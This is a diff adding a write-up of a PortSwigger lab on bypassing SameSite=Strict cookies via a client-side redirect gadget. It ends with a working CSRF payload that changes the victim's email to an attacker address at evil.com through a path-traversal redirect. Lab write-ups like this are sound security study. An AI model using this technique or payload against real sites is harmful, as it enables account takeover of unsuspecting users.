@@ -1,0 +1,49 @@
+# CSRF - SameSite Strict Bypass via Client-Side Redirect
+
+**Lab URL**: (https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect)
+**Category**: CSRF  
+**Difficulty**: Practitioner  
+
+---
+
+##  Overview / What I Learned
+
+- This lab demonstrates a CSRF vulnerability even when the server uses `SameSite=Strict` cookies.
+- I learned how **client-side redirects** from the target domain can be used to bypass SameSite restrictions.
+- Discovered that an attacker can leverage a client-side controlled redirect (`postId`) to trigger authenticated actions using a **GET-based CSRF**.
+
+---
+
+##  Tools Used
+
+- **Burp Suite**
+- **PortSwigger Exploit Server**
+- **Browser DevTools**
+
+---
+
+##  Exploit Steps / Attack Methodology
+
+### 1. Analyzing the Email Change Request
+- Intercepted `POST /my-account/change-email` request.
+- No CSRF token or unpredictable data—potentially vulnerable.
+- Noticed `Set-Cookie: session=...; SameSite=Strict` header in login response.
+
+### 2. Discovering a Redirect Gadget
+- Posted a comment on a blog post → got redirected from `/post/comment/confirmation?postId=1`.
+- Studied `/resources/js/commentConfirmationRedirect.js` → confirms **client-side redirect** using `postId`.
+
+### 3. Bypassing SameSite=Strict
+- Tested `/post/comment/confirmation?postId=1/../../my-account` → redirects to `/my-account` with authenticated session.
+- Verified that redirect happens **after landing on a same-origin page**, so cookies are sent.
+
+### 4. Verifying GET Request for Email Change
+- Sent `GET /my-account/change-email?email=pwned@web-security-academy.net&submit=1` in Burp Repeater.
+- Email address successfully changed → CSRF possible via GET.
+
+### 5. Final Exploit Payload
+
+```html
+<script>
+  document.location = "https://labbid.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=attacker%40evil.com%26submit=1";
+</script>
